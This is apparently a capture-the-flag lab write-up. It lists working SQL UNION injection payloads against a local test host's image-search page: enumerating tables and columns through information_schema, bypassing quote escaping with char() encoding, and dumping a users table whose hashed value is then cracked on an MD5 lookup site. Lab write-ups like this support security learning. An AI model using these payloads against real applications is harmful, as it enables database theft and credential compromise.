# http://172.28.128.136/?page=searchimg

1. 1 union select TABLE_NAME, 2 from information_schema.tables
   - to get all table's names
2. 1 union select column_name, 2 FROM information_schema.columns WHERE table_name = char(108,105,115,116,95,105,109,97,103,101,115)
   - to get all 'list_images' table column's names.
   - char(108,105,115,116,95,105,109,97,103,101,115) = list_images. we need this to avoid mariaDB's magic quotes defence.
3. 1 union select title, comment FROM users
   - to get the flag. Decrypt comment value with md5 - https://md5decrypt.net/en/
